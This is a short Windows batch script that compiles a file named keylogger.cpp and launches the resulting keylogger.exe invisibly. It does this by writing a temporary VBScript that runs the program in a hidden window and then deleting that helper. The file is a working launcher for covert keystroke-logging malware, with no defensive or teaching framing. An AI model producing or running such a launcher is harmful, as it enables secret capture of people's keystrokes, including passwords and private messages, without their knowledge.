@echo off
REM 

REM
set CppFile=keylogger.cpp
set ExeFile=keylogger.exe

REM 
g++ %CppFile% -o %ExeFile% -w
if %errorlevel% neq 0 (
    exit /b
)

REM 
echo Set WshShell = CreateObject("WScript.Shell") > hide.vbs
echo WshShell.Run """%ExeFile%""", 0, False >> hide.vbs

REM 
cscript //nologo hide.vbs

REM
del hide.vbs
